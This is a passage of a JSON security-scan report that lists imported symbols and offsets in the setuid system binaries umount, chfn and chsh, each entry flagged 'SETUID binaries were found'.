                  "details": "Offset: 0x00008fe8, Symbol: environ, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ff0, Symbol: _ITM_registerTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ff8, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00009020, Symbol: __progname, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00009028, Symbol: stdout, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00009030, Symbol: optind, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00009040, Symbol: optarg, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00009060, Symbol: stderr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x00000000, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x000032d0, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x00003370, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc38, Symbol: __strcat_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc40, Symbol: utime, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc48, Symbol: __snprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc50, Symbol: free, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc58, Symbol: is_selinux_enabled, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc60, Symbol: strcasecmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc68, Symbol: closelog, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc70, Symbol: pam_start, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc78, Symbol: __errno_location, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc80, Symbol: unlink, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc88, Symbol: strncpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc90, Symbol: strncmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc98, Symbol: strcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dca0, Symbol: chroot, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dca8, Symbol: puts, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dcb0, Symbol: ferror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dcb8, Symbol: lckpwdf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dcc0, Symbol: qsort, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dcc8, Symbol: selinux_check_access, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dcd0, Symbol: fcntl, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dcd8, Symbol: write, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dce0, Symbol: getpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dce8, Symbol: textdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dcf0, Symbol: __open_2, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dcf8, Symbol: fclose, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd00, Symbol: getpwuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd08, Symbol: bindtextdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd10, Symbol: dcgettext, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd18, Symbol: strlen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd20, Symbol: __lxstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd28, Symbol: getpwuid_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd30, Symbol: pam_end, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd38, Symbol: chdir, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd40, Symbol: __stack_chk_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd48, Symbol: getuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd50, Symbol: getopt_long, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd58, Symbol: pam_strerror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd60, Symbol: strchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd68, Symbol: snprintf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd70, Symbol: audit_open, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd78, Symbol: strrchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd80, Symbol: __assert_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd88, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd90, Symbol: memset, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd98, Symbol: geteuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dda0, Symbol: selinux_set_callback, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dda8, Symbol: close, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ddb0, Symbol: strspn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ddb8, Symbol: matchpathcon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ddc0, Symbol: fputc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ddc8, Symbol: strcspn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ddd0, Symbol: read, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ddd8, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dde0, Symbol: execve, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dde8, Symbol: calloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ddf0, Symbol: strcmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ddf8, Symbol: putc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de00, Symbol: signal, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de08, Symbol: strtoll, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de10, Symbol: __memcpy_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de18, Symbol: getprevcon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de20, Symbol: feof, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de28, Symbol: umask, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de30, Symbol: strtol, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de38, Symbol: realpath, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de40, Symbol: getgrnam, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de48, Symbol: kill, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de50, Symbol: fileno, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de58, Symbol: getgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de60, Symbol: __xstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de68, Symbol: setfscreatecon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de70, Symbol: malloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de78, Symbol: fflush, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de80, Symbol: __vasprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de88, Symbol: __fxstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de90, Symbol: getlogin, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de98, Symbol: fseek, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dea0, Symbol: security_getenforce, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dea8, Symbol: __fgets_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000deb0, Symbol: __strncpy_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000deb8, Symbol: setrlimit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dec0, Symbol: setreuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dec8, Symbol: setregid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ded0, Symbol: realloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ded8, Symbol: fdopen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dee0, Symbol: getpwnam_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dee8, Symbol: setlocale, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000def0, Symbol: __printf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000def8, Symbol: fchmod, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df00, Symbol: __syslog_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df08, Symbol: fsync, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df10, Symbol: waitpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df18, Symbol: open, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df20, Symbol: access, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df28, Symbol: fchown, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df30, Symbol: audit_log_user_avc_message, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df38, Symbol: fopen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df40, Symbol: ulckpwdf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df48, Symbol: perror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df50, Symbol: rename, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df58, Symbol: strtoul, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df60, Symbol: openlog, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df68, Symbol: pam_acct_mgmt, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df70, Symbol: freecon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df78, Symbol: link, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df80, Symbol: exit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df88, Symbol: __fprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df90, Symbol: setuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df98, Symbol: strdup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dfa0, Symbol: pam_authenticate, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dfa8, Symbol: putpwent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dfb0, Symbol: strerror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dfb8, Symbol: sleep, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dfc0, Symbol: getc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dfc8, Symbol: fork, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dfd0, Symbol: __ctype_b_loc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dfd8, Symbol: _ITM_deregisterTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dfe0, Symbol: __libc_start_main, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dfe8, Symbol: __gmon_start__, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dff0, Symbol: _ITM_registerTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dff8, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000e120, Symbol: misc_conv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000eb88, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000eb90, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ebc0, Symbol: stdout, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ebd0, Symbol: stdin, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ebd8, Symbol: optind, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ebe0, Symbol: __environ, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ebe8, Symbol: optarg, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ec00, Symbol: stderr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x00000000, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x000032b0, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cc58, Symbol: utime, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cc60, Symbol: __snprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cc68, Symbol: free, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cc70, Symbol: is_selinux_enabled, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cc78, Symbol: closelog, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cc80, Symbol: pam_start, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cc88, Symbol: __errno_location, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cc90, Symbol: unlink, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cc98, Symbol: strncpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cca0, Symbol: strncmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cca8, Symbol: strcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ccb0, Symbol: chroot, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ccb8, Symbol: puts, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ccc0, Symbol: ferror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ccc8, Symbol: lckpwdf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ccd0, Symbol: qsort, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ccd8, Symbol: selinux_check_access, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cce0, Symbol: fcntl, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cce8, Symbol: write, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ccf0, Symbol: getpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ccf8, Symbol: textdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd00, Symbol: __open_2, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd08, Symbol: fclose, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd10, Symbol: getpwuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd18, Symbol: bindtextdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd20, Symbol: dcgettext, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd28, Symbol: strlen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd30, Symbol: __lxstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd38, Symbol: getpwuid_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd40, Symbol: pam_end, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd48, Symbol: chdir, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd50, Symbol: __stack_chk_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd58, Symbol: getuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd60, Symbol: getopt_long, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd68, Symbol: pam_strerror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd70, Symbol: strchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd78, Symbol: snprintf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd80, Symbol: audit_open, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd88, Symbol: strrchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd90, Symbol: __assert_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd98, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cda0, Symbol: memset, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cda8, Symbol: geteuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cdb0, Symbol: setusershell, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cdb8, Symbol: selinux_set_callback, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cdc0, Symbol: close, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cdc8, Symbol: matchpathcon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cdd0, Symbol: fputc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cdd8, Symbol: getusershell, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cde0, Symbol: read, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cde8, Symbol: execve, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cdf0, Symbol: calloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cdf8, Symbol: strcmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce00, Symbol: putc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce08, Symbol: signal, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce10, Symbol: strtoll, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce18, Symbol: __memcpy_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce20, Symbol: getprevcon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce28, Symbol: feof, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce30, Symbol: umask, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce38, Symbol: realpath, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce40, Symbol: getgrnam, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce48, Symbol: kill, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce50, Symbol: fileno, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce58, Symbol: getgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
